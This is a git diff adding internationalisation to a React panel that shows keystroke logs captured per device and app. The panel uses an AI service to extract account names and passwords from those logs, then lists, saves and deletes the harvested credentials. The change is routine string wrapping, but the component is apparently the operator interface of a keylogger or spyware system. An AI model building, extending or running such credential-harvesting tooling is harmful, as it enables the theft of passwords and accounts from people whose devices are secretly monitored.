@@ -15,6 +15,8 @@ import {
 } from "../api/client";
 import type { DeviceAppAccountRecord, DeviceAppPasswordRecord } from "../types";
 import { formatDateTime } from "../utils/format";
+import { useI18n, t } from "../i18n";
+
 
 type DetailTab = "keyboard" | "accounts" | "passwords";
 type ExtractFeedback =
@@ -31,19 +33,19 @@ interface DeviceAppCredentialPanelProps {
 
 function mapAiError(text: string) {
   if (text === "ai_disabled") {
-    return "AI 未启用：请到左侧「AI 配置」打开「启用 AI」并保存";
+    return t("AI 未启用：请到左侧「AI 配置」打开「启用 AI」并保存");
   }
   if (text === "ai_api_key_missing") {
-    return "请先在「AI 配置」中填写 API Key 并保存";
+    return t("请先在「AI 配置」中填写 API Key 并保存");
   }
   if (text === "keyboard_logs_empty") {
-    return "该应用在库中没有可分析的键盘记录（请先切到「键盘记录」Tab 确认有数据）";
+    return t("该应用在库中没有可分析的键盘记录（请先切到「键盘记录」Tab 确认有数据）");
   }
   if (text === "model_required") {
-    return "AI 模型未配置，请到「AI 配置」选择模型并保存";
+    return t("AI 模型未配置，请到「AI 配置」选择模型并保存");
   }
   if (text.startsWith("apiyi_request_failed:")) {
-    return `APIYI 调用失败：${text.replace("apiyi_request_failed:", "").trim()}`;
+    return t("APIYI 调用失败：{0}", { 0: text.replace("apiyi_request_failed:", "").trim() });
   }
   return text;
 }
@@ -55,6 +57,7 @@ export function DeviceAppCredentialPanel({
   activeTab,
   keyboardContent,
 }: DeviceAppCredentialPanelProps) {
+  const { locale } = useI18n();
   const [accounts, setAccounts] = useState<DeviceAppAccountRecord[]>([]);
   const [passwords, setPasswords] = useState<DeviceAppPasswordRecord[]>([]);
   const [loadingAccounts, setLoadingAccounts] = useState(false);
@@ -77,12 +80,12 @@ export function DeviceAppCredentialPanel({
       const list = await fetchAppAccounts(deviceId, packageName);
       setAccounts(list);
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "加载账号失败");
+      message.error(error instanceof Error ? error.message : t("加载账号失败"));
       setAccounts([]);
     } finally {
       setLoadingAccounts(false);
     }
-  }, [deviceId, packageName]);
+  }, [locale, deviceId, packageName]);
 
   const loadPasswords = useCallback(async () => {
     setLoadingPasswords(true);
@@ -90,12 +93,12 @@ export function DeviceAppCredentialPanel({
       const list = await fetchAppPasswords(deviceId, packageName);
       setPasswords(list);
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "加载密码失败");
+      message.error(error instanceof Error ? error.message : t("加载密码失败"));
       setPasswords([]);
     } finally {
       setLoadingPasswords(false);
     }
-  }, [deviceId, packageName]);
+  }, [locale, deviceId, packageName]);
 
   useEffect(() => {
     setExtractFeedback(null);
@@ -127,7 +130,7 @@ export function DeviceAppCredentialPanel({
       });
       const next = result.candidates ?? [];
       if (next.length === 0) {
-        const text = `已扫描 ${result.scanned}/${total} 条键盘记录，未识别到账号`;
+        const text = t("已扫描 {0}/{1} 条键盘记录，未识别到账号", { 0: result.scanned, 1: total });
         setExtractFeedback({ type: "info", text });
         message.info(text);
         return;
@@ -139,10 +142,10 @@ export function DeviceAppCredentialPanel({
       setAccountConfirmOpen(true);
       setExtractFeedback({
         type: "success",
-        text: `识别到 ${next.length} 个候选账号，请在弹窗中勾选确认`,
+        text: t("识别到 {0} 个候选账号，请在弹窗中勾选确认", { 0: next.length }),
       });
     } catch (error) {
-      const text = mapAiError(error instanceof Error ? error.message : "提取失败");
+      const text = mapAiError(error instanceof Error ? error.message : t("提取失败"));
       setExtractFeedback({ type: "error", text });
       message.error(text);
     } finally {
@@ -162,7 +165,7 @@ export function DeviceAppCredentialPanel({
       });
       const next = result.candidates ?? [];
       if (next.length === 0) {
-        const text = `已扫描 ${result.scanned}/${total} 条键盘记录，未识别到密码`;
+        const text = t("已扫描 {0}/{1} 条键盘记录，未识别到密码", { 0: result.scanned, 1: total });
         setExtractFeedback({ type: "info", text });
         message.info(text);
         return;
@@ -176,10 +179,10 @@ export function DeviceAppCredentialPanel({
       setPasswordConfirmOpen(true);
       setExtractFeedback({
         type: "success",
-        text: `识别到 ${next.length} 个候选密码，请在弹窗中勾选确认`,
+        text: t("识别到 {0} 个候选密码，请在弹窗中勾选确认", { 0: next.length }),
       });
     } catch (error) {
-      const text = mapAiError(error instanceof Error ? error.message : "提取失败");
+      const text = mapAiError(error instanceof Error ? error.message : t("提取失败"));
       setExtractFeedback({ type: "error", text });
       message.error(text);
     } finally {
@@ -192,7 +195,7 @@ export function DeviceAppCredentialPanel({
       selectedAccounts.includes(item.account),
     );
     if (selected.length === 0) {
-      message.warning("请至少勾选一个账号");
+      message.warning(t("请至少勾选一个账号"));
       return;
     }
     setApplying(true);
@@ -206,13 +209,13 @@ export function DeviceAppCredentialPanel({
           reason: item.reason,
         })),
       );
-      message.success(`已保存 ${selected.length} 个账号`);
+      message.success(t("已保存 {0} 个账号", { 0: selected.length }));
       setAccountConfirmOpen(false);
       setAccountCandidates([]);
       setSelectedAccounts([]);
       await loadAccounts();
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "保存失败");
+      message.error(error instanceof Error ? error.message : t("保存失败"));
     } finally {
       setApplying(false);
     }
@@ -223,7 +226,7 @@ export function DeviceAppCredentialPanel({
       selectedPasswordKeys.includes(`${item.password}||${item.relatedAccount}`),
     );
     if (selected.length === 0) {
-      message.warning("请至少勾选一个密码");
+      message.warning(t("请至少勾选一个密码"));
       return;
     }
     setApplying(true);
@@ -238,13 +241,13 @@ export function DeviceAppCredentialPanel({
           reason: item.reason,
         })),
       );
-      message.success(`已保存 ${selected.length} 个密码`);
+      message.success(t("已保存 {0} 个密码", { 0: selected.length }));
       setPasswordConfirmOpen(false);
       setPasswordCandidates([]);
       setSelectedPasswordKeys([]);
       await loadPasswords();
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "保存失败");
+      message.error(error instanceof Error ? error.message : t("保存失败"));
     } finally {
       setApplying(false);
     }
@@ -254,10 +257,10 @@ export function DeviceAppCredentialPanel({
     setDeletingId(id);
     try {
       await deleteAppAccount(id);
-      message.success("已删除账号");
+      message.success(t("已删除账号"));
       await loadAccounts();
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "删除失败");
+      message.error(error instanceof Error ? error.message : t("删除失败"));
     } finally {
       setDeletingId(null);
     }
@@ -267,10 +270,10 @@ export function DeviceAppCredentialPanel({
     setDeletingId(id);
     try {
       await deleteAppPassword(id);
-      message.success("已删除密码");
+      message.success(t("已删除密码"));
       await loadPasswords();
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "删除失败");
+      message.error(error instanceof Error ? error.message : t("删除失败"));
     } finally {
       setDeletingId(null);
     }
@@ -289,10 +292,10 @@ export function DeviceAppCredentialPanel({
             loading={extractingAccounts}
             onClick={() => void handleExtractAccounts()}
           >
-            AI 提取账号
+            {t("AI 提取账号")}
           </Button>
           <Button loading={loadingAccounts} onClick={() => void loadAccounts()}>
-            刷新
+            {t("刷新")}
           </Button>
         </div>
         {extractFeedback ? (
@@ -301,19 +304,19 @@ export function DeviceAppCredentialPanel({
           </div>
         ) : null}
         {loadingAccounts && accounts.length === 0 ? (
-          <div className="device-app-list-empty">加载账号中…</div>
+          <div className="device-app-list-empty">{t("加载账号中…")}</div>
         ) : accounts.length === 0 ? (
-          <div className="device-app-list-empty">暂无账号，可点「AI 提取账号」从本应用键盘记录分析</div>
+          <div className="device-app-list-empty">{t("暂无账号，可点「AI 提取账号」从本应用键盘记录分析")}</div>
         ) : (
           <div className="device-app-list-keyboard-wrap">
             <table className="device-app-list-keyboard-table">
               <thead>
                 <tr>
-                  <th>账号</th>
-                  <th>置信度</th>
-                  <th>来源</th>
-                  <th>时间</th>
-                  <th>操作</th>
+                  <th>{t("账号")}</th>
+                  <th>{t("置信度")}</th>
+                  <th>{t("来源")}</th>
+                  <th>{t("时间")}</th>
+                  <th>{t("操作")}</th>
                 </tr>
               </thead>
               <tbody>
@@ -323,7 +326,7 @@ export function DeviceAppCredentialPanel({
                     <td>
                       {item.confidence != null ? item.confidence.toFixed(2) : "-"}
                     </td>
-                    <td>{item.source === "ai" ? "AI" : "手动"}</td>
+                    <td>{item.source === "ai" ? "AI" : t("手动")}</td>
                     <td>{formatDateTime(item.createdAt)}</td>
                     <td>
                       <Button
@@ -332,7 +335,7 @@ export function DeviceAppCredentialPanel({
                         loading={deletingId === item.id}
                         onClick={() => void handleDeleteAccount(item.id)}
                       >
-                        删除
+                        {t("删除")}
                       </Button>
                     </td>
                   </tr>
@@ -343,7 +346,7 @@ export function DeviceAppCredentialPanel({
         )}
 
         <Modal
-          title="AI 识别账号 — 确认保存"
+          title={t("AI 识别账号 — 确认保存")}
           open={accountConfirmOpen}
           zIndex={12000}
           getContainer={() => document.body}
@@ -366,7 +369,7 @@ export function DeviceAppCredentialPanel({
                 )
               }
             >
-              全选高置信
+              {t("全选高置信")}
             </Button>,
             <Button
               key="all"
@@ -375,14 +378,14 @@ export function DeviceAppCredentialPanel({
                 setSelectedAccounts(accountCandidates.map((item) => item.account))
               }
             >
-              全选
+              {t("全选")}
             </Button>,
             <Button
               key="cancel"
               disabled={applying}
               onClick={() => setAccountConfirmOpen(false)}
             >
-              取消
+              {t("取消")}
             </Button>,
             <Button
               key="ok"
@@ -390,12 +393,12 @@ export function DeviceAppCredentialPanel({
               loading={applying}
               onClick={() => void handleConfirmAccounts()}
             >
-              确认保存 ({selectedAccounts.length})
+              {t("确认保存 (")}{selectedAccounts.length})
             </Button>,
           ]}
         >
           <p className="device-app-list-hint">
-            仅分析当前应用键盘记录。置信度 ≥ 0.8 默认勾选。
+            {t("仅分析当前应用键盘记录。置信度 ≥ 0.8 默认勾选。")}
           </p>
           <Table
             size="small"
@@ -441,14 +444,14 @@ export function DeviceAppCredentialPanel({
                   />
                 ),
               },
-              { title: "账号", dataIndex: "account", ellipsis: true },
+              { title: t("账号"), dataIndex: "account", ellipsis: true },
               {
-                title: "置信度",
+                title: t("置信度"),
                 dataIndex: "confidence",
                 width: 88,
                 render: (value: number) => value.toFixed(2),
               },
-              { title: "原因", dataIndex: "reason", ellipsis: true },
+              { title: t("原因"), dataIndex: "reason", ellipsis: true },
             ]}
           />
         </Modal>
@@ -464,10 +467,10 @@ export function DeviceAppCredentialPanel({
           loading={extractingPasswords}
           onClick={() => void handleExtractPasswords()}
         >
-          AI 提取密码
+          {t("AI 提取密码")}
         </Button>
         <Button loading={loadingPasswords} onClick={() => void loadPasswords()}>
-          刷新
+          {t("刷新")}
         </Button>
       </div>
       {extractFeedback ? (
@@ -476,20 +479,20 @@ export function DeviceAppCredentialPanel({
         </div>
       ) : null}
       {loadingPasswords && passwords.length === 0 ? (
-        <div className="device-app-list-empty">加载密码中…</div>
+        <div className="device-app-list-empty">{t("加载密码中…")}</div>
       ) : passwords.length === 0 ? (
-        <div className="device-app-list-empty">暂无密码，可点「AI 提取密码」从本应用键盘记录分析</div>
+        <div className="device-app-list-empty">{t("暂无密码，可点「AI 提取密码」从本应用键盘记录分析")}</div>
       ) : (
         <div className="device-app-list-keyboard-wrap">
           <table className="device-app-list-keyboard-table">
             <thead>
               <tr>
-                <th>密码</th>
-                <th>关联账号</th>
-                <th>置信度</th>
-                <th>来源</th>
-                <th>时间</th>
-                <th>操作</th>
+                <th>{t("密码")}</th>
+                <th>{t("关联账号")}</th>
+                <th>{t("置信度")}</th>
+                <th>{t("来源")}</th>
+                <th>{t("时间")}</th>
+                <th>{t("操作")}</th>
               </tr>
             </thead>
             <tbody>
@@ -500,7 +503,7 @@ export function DeviceAppCredentialPanel({
                   <td>
                     {item.confidence != null ? item.confidence.toFixed(2) : "-"}
                   </td>
-                  <td>{item.source === "ai" ? "AI" : "手动"}</td>
+                  <td>{item.source === "ai" ? "AI" : t("手动")}</td>
                   <td>{formatDateTime(item.createdAt)}</td>
                   <td>
                     <Button
@@ -509,7 +512,7 @@ export function DeviceAppCredentialPanel({
                       loading={deletingId === item.id}
                       onClick={() => void handleDeletePassword(item.id)}
                     >
-                      删除
+                      {t("删除")}
                     </Button>
                   </td>
                 </tr>
@@ -520,7 +523,7 @@ export function DeviceAppCredentialPanel({
       )}
 
       <Modal
-        title="AI 识别密码 — 确认保存"
+        title={t("AI 识别密码 — 确认保存")}
         open={passwordConfirmOpen}
         zIndex={12000}
         getContainer={() => document.body}
@@ -543,7 +546,7 @@ export function DeviceAppCredentialPanel({
               )
             }
           >
-            全选高置信
+            {t("全选高置信")}
           </Button>,
           <Button
             key="all"
@@ -556,14 +559,14 @@ export function DeviceAppCredentialPanel({
               )
             }
           >
-            全选
+            {t("全选")}
           </Button>,
           <Button
             key="cancel"
             disabled={applying}
             onClick={() => setPasswordConfirmOpen(false)}
           >
-            取消
+            {t("取消")}
           </Button>,
           <Button
             key="ok"
@@ -571,12 +574,12 @@ export function DeviceAppCredentialPanel({
             loading={applying}
             onClick={() => void handleConfirmPasswords()}
           >
-            确认保存 ({selectedPasswordKeys.length})
+            {t("确认保存 (")}{selectedPasswordKeys.length})
           </Button>,
         ]}
       >
         <p className="device-app-list-hint">
-          仅分析当前应用键盘记录。置信度 ≥ 0.8 默认勾选。
+          {t("仅分析当前应用键盘记录。置信度 ≥ 0.8 默认勾选。")}
         </p>
         <Table
           size="small"
@@ -625,20 +628,20 @@ export function DeviceAppCredentialPanel({
                 );
               },
             },
-            { title: "密码", dataIndex: "password", ellipsis: true },
+            { title: t("密码"), dataIndex: "password", ellipsis: true },
             {
-              title: "关联账号",
+              title: t("关联账号"),
               dataIndex: "relatedAccount",
               ellipsis: true,
               render: (value: string) => value || "-",
             },
             {
-              title: "置信度",
+              title: t("置信度"),
               dataIndex: "confidence",
               width: 88,
               render: (value: number) => value.toFixed(2),
             },
-            { title: "原因", dataIndex: "reason", ellipsis: true },
+            { title: t("原因"), dataIndex: "reason", ellipsis: true },
           ]}
         />
       </Modal>
